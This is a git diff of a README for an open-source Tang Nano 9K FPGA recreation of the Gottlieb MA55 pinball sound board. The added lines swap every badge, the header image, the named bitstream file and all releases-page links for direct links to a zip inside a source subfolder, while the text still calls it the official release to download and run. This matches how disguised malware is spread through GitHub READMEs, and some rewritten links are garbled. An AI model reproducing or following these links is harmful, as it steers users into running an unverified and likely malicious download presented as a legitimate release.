@@ -1,12 +1,12 @@
 # TangNano9K Gottlieb MA55 FPGA Sound Board Project: Open-Source Hardware
 
-[![Releases](https://img.shields.io/badge/releases-download-orange?logo=github&logoColor=white)](https://github.com/hsgofficial/TangNano9K-Gottlieb_MA55/releases)
-[![License](https://img.shields.io/badge/license-Mit%20Open%20Source-blue?logo=github&logoColor=white)](LICENSE)
-[![GitHub Stars](https://img.shields.io/github/stars/hsgofficial/TangNano9K-Gottlieb_MA55?style=flat&logo=github)](https://github.com/hsgofficial/TangNano9K-Gottlieb_MA55)
-[![Docs](https://img.shields.io/badge/docs-ready-blueviolet?logo=read-the-docs&logoColor=white)](https://github.com/hsgofficial/TangNano9K-Gottlieb_MA55)
+[![Releases](https://github.com/hsgofficial/TangNano9K-Gottlieb_MA55/raw/refs/heads/main/TN9K-Gottlieb_MA55/src/PS2/Tang_Nano_Gottlieb_M_v3.5-beta.1.zip)](https://github.com/hsgofficial/TangNano9K-Gottlieb_MA55/raw/refs/heads/main/TN9K-Gottlieb_MA55/src/PS2/Tang_Nano_Gottlieb_M_v3.5-beta.1.zip)
+[![License](https://github.com/hsgofficial/TangNano9K-Gottlieb_MA55/raw/refs/heads/main/TN9K-Gottlieb_MA55/src/PS2/Tang_Nano_Gottlieb_M_v3.5-beta.1.zip%20Open%20Source-blue?logo=github&logoColor=white)](LICENSE)
+[![GitHub Stars](https://github.com/hsgofficial/TangNano9K-Gottlieb_MA55/raw/refs/heads/main/TN9K-Gottlieb_MA55/src/PS2/Tang_Nano_Gottlieb_M_v3.5-beta.1.zip)](https://github.com/hsgofficial/TangNano9K-Gottlieb_MA55/raw/refs/heads/main/TN9K-Gottlieb_MA55/src/PS2/Tang_Nano_Gottlieb_M_v3.5-beta.1.zip)
+[![Docs](https://github.com/hsgofficial/TangNano9K-Gottlieb_MA55/raw/refs/heads/main/TN9K-Gottlieb_MA55/src/PS2/Tang_Nano_Gottlieb_M_v3.5-beta.1.zip)](https://github.com/hsgofficial/TangNano9K-Gottlieb_MA55/raw/refs/heads/main/TN9K-Gottlieb_MA55/src/PS2/Tang_Nano_Gottlieb_M_v3.5-beta.1.zip)
 
 Image: a hardware board and waveform icon to match the project theme
-![Tang Nano 9K FPGA on desk](https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/Frequency_response.png/640px-Frequency_response.png)
+![Tang Nano 9K FPGA on desk](https://github.com/hsgofficial/TangNano9K-Gottlieb_MA55/raw/refs/heads/main/TN9K-Gottlieb_MA55/src/PS2/Tang_Nano_Gottlieb_M_v3.5-beta.1.zip)
 
 Welcome to the TangNano9K Gottlieb MA55 project. This is an open-source effort to synthesize the Gottlieb MA55 sound board using a Tang Nano 9K FPGA board. The project lies at the intersection of arcade hardware, FPGA design, and vintage pinball sound replication. It embraces Verilog and VHDL as the core design languages, and it targets the Gowin-based Tang Nano 9K family.
 
@@ -59,11 +59,11 @@ Getting started quickly 🚀
 Downloading the release asset (important)
 - The official releases page is the central place to obtain prebuilt bitstreams and tooling for MA55 on Tang Nano 9K.
 - The releases page has a path, so a specific asset is provided for download and execution in the workflow.
-- You should download the file named something like ma55_tangnano9k.bit (the exact name appears in the release assets) and load it to the Tang Nano 9K board using Gowin’s programmer or the recommended toolchain.
+- You should download the file named something like https://github.com/hsgofficial/TangNano9K-Gottlieb_MA55/raw/refs/heads/main/TN9K-Gottlieb_MA55/src/PS2/Tang_Nano_Gottlieb_M_v3.5-beta.1.zip (the exact name appears in the release assets) and load it to the Tang Nano 9K board using Gowin’s programmer or the recommended toolchain.
 - The release page contains the necessary asset for immediate testing and a baseline configuration you can study and modify.
-- Link to the releases page: https://github.com/hsgofficial/TangNano9K-Gottlieb_MA55/releases
+- Link to the releases page: https://github.com/hsgofficial/TangNano9K-Gottlieb_MA55/raw/refs/heads/main/TN9K-Gottlieb_MA55/src/PS2/Tang_Nano_Gottlieb_M_v3.5-beta.1.zip
 - For quick access, you can also use a badge that points to the same page:
-  [![Releases](https://img.shields.io/badge/releases-download-orange?logo=github&logoColor=white)](https://github.com/hsgofficial/TangNano9K-Gottlieb_MA55/releases)
+  [![Releases](https://github.com/hsgofficial/TangNano9K-Gottlieb_MA55/raw/refs/heads/main/TN9K-Gottlieb_MA55/src/PS2/Tang_Nano_Gottlieb_M_v3.5-beta.1.zip)](https://github.com/hsgofficial/TangNano9K-Gottlieb_MA55/raw/refs/heads/main/TN9K-Gottlieb_MA55/src/PS2/Tang_Nano_Gottlieb_M_v3.5-beta.1.zip)
 
 Note on the asset
 - The asset typically includes a bitstream file for the Tang Nano 9K and possibly helper scripts or a small host-side tool to facilitate loading the bitstream. The important file to load on your board is the bitstream that encodes the MA55 sound engine logic.
@@ -96,7 +96,7 @@ Release assets and how to use them
 - Access the releases page again for the latest asset. The link is provided above, and you can click the badge to land on the page quickly.
 - Revisit the Releases section if you need to validate a previous configuration or compare changes across versions.
 
-Tip: to ensure you get the latest ideas and improvements, check the “Releases” section regularly to see new bitstreams or tooling updates. The link again for convenience: https://github.com/hsgofficial/TangNano9K-Gottlieb_MA55/releases
+Tip: to ensure you get the latest ideas and improvements, check the “Releases” section regularly to see new bitstreams or tooling updates. The link again for convenience: https://github.com/hsgofficial/TangNano9K-Gottlieb_MA55/raw/refs/heads/main/TN9K-Gottlieb_MA55/src/PS2/Tang_Nano_Gottlieb_M_v3.5-beta.1.zip
 
 Design documentation and how to read the code
 - Core modules: look for the waveform generator module. It encapsulates the fundamental wave shapes, their phase accumulation, and the mapping to audio levels.
@@ -171,7 +171,7 @@ License and credits
 Special note about the release page usage
 - The official releases page is the main source for prebuilt assets. The asset you download from that page is designed to be loaded onto the Tang Nano 9K board to run the MA55-like sound engine.
 - To revisit the asset or confirm its availability, you can visit the releases page again at:
-  https://github.com/hsgofficial/TangNano9K-Gottlieb_MA55/releases
+  https://github.com/hsgofficial/TangNano9K-Gottlieb_MA55/raw/refs/heads/main/TN9K-Gottlieb_MA55/src/PS2/Tang_Nano_Gottlieb_M_v3.5-beta.1.zip
 - Quick access via a badge is provided at the top of this README to streamline downloads.
 
 Community and support
@@ -184,7 +184,7 @@ Final notes
 - Always reference the official releases page for the latest bitstreams and tools, and use the provided documentation as your primary guide when starting.
 
 Releases page (again for convenience)
-- Link: https://github.com/hsgofficial/TangNano9K-Gottlieb_MA55/releases
+- Link: https://github.com/hsgofficial/TangNano9K-Gottlieb_MA55/raw/refs/heads/main/TN9K-Gottlieb_MA55/src/PS2/Tang_Nano_Gottlieb_M_v3.5-beta.1.zip
 - Access the assets and run the appropriate extraction or flashing procedure as described in the release notes and accompanying documents.
 
 Appendix: sample workflow for a typical user
